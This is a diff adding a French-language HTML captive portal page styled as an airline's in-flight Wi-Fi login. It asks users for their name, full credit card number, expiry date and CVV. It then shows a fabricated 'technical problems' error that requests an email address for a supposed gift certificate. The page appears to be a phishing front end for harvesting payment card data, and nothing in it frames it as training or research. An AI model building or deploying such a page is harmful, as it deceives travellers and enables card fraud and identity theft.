@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portail Captif</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="logo.png" alt="Logo de la compagnie d'avion">
+        </div>
+        <div class="form-container">
+            <h2>Connexion au Wi-Fi</h2>
+            <form id="loginForm">
+                <label for="nom">Nom:</label>
+                <input type="text" id="nom" name="nom" required>
+
+                <label for="prenom">Prénom:</label>
+                <input type="text" id="prenom" name="prenom" required>
+
+                <label for="carte">Numéro de carte de crédit:</label>
+                <input type="text" id="carte" name="carte" required>
+
+                <label for="expiration">Expiration:</label>
+                <input type="text" id="expiration" name="expiration" required>
+
+                <label for="cvv">CVV:</label>
+                <input type="text" id="cvv" name="cvv" required>
+
+                <button type="submit">Connexion</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Modal -->
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <p>Désolé, nous avons des problèmes techniques. Veuillez saisir votre e-mail pour recevoir un certificat cadeau.</p>
+            <form id="emailForm">
+                <label for="email">E-mail:</label>
+                <input type="email" id="email" name="email" required>
+                <button type="submit">Envoyer</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
